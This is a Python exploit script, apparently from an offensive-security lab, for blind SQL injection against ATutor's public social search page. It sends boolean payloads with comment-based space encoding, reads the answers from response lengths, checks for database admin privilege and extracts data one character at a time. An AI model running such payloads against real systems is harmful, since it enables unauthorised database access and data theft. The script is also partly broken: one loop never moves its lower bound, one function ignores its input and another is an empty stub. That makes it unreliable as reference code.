import requests
import sys
SQL_URL = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
LOGIN_URL = "http://atutor/ATutor/login.php"
COMMENT="%23"
#sqli = lambda url, query, comment: F"{url}test') OR ({query}){comment}".replace(' ','/**/')
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"
ENCODE = lambda s: s.replace(' ','/**/')

QUERIES = {
    'DB_VERSION': "select version()",
    'STRING_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
    'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
}

def blind_query(ip, sub_query, truth_condition, encode=False, debug=False):
    target = ENCODE(blind_sqli_truthy(ip,sub_query, COMMENT)) if encode else blind_sqli_truthy(ip,sub_query, COMMENT)
    res = requests.get(target)
    if debug == True:
        print("target: ", target)
        print("response headers: ", res.headers)
        print("response: ", res.content)
    return truth_condition(res)

# here we specify the condition that lets us infer the result of a query from the response 
def response_truth_condition(response): 
    content_length = int(response.headers['Content-Length'])
    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False

def question(ip, sub_query, debug=False):
    if(blind_query(ip, sub_query, response_truth_condition, encode=True, debug=debug)):
        print(F"\n(+) Result of expression [{sub_query}] is true")
    else:
        print(F"\n(+) Result of expression [{sub_query}] is false")
def get_char(position, ip, sub_query):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if(blind_query(ip, F"ascii(substring((select version()),{position},1))>{mid}", response_truth_condition, encode=True, debug=False)):
        #if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

def getString(ip, sub_query, string_length):
    s = ''
    for position in range(1,string_length):
        lo, hi = 32, 128
        while lo <= hi:
            mid = lo + (hi - lo) // 2
            if(blind_query(ip, QUERIES['STRING_EXFIL'](sub_query,position,mid), response_truth_condition, encode=True, debug=False)):
                hi = mid - 1
        s+=chr(lo)
    return s
def getLength(ip, sub_query, ):
    pass
'''
def getLength(ip, sub_query, lowbound, upperbound):
    for i in range(lowbound, upperbound):
        query = F"select/**/length(({sub_query}))={i}"
        if(searchFriends_blind(ip,query,debug=False)):
            print(F"(+) Length of result from expression [{sub_query}]: {i}")
            return i
def getString(ip, sub_query, string_length):
    s_exfil = ''
    for i in range(1, string_length + 1):
        for j in range(32, 126):
            query = F"select/**/ascii(substring(({sub_query}),{i},1))={j}"
            if(searchFriends_blind(ip, query, debug=False)):
                s_exfil += chr(j)
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    print(F"(+) Exfiltrated string from expression [{sub_query}]: {s_exfil}")
    return s_exfil
'''

def main():
    #blind_query(SQL_URL, queries['CURRENT_USER_IS_DB_ADMIN']('root@localhosts'), response_truth_condition, True, True)
    question(SQL_URL, QUERIES['CURRENT_USER_IS_DB_ADMIN']('root@localhost'))
    print(getString(SQL_URL, "select version()", 20))
    #for i in range(1,20):
    #    print(get_char(i,SQL_URL,""))

if __name__ == "__main__":
    main()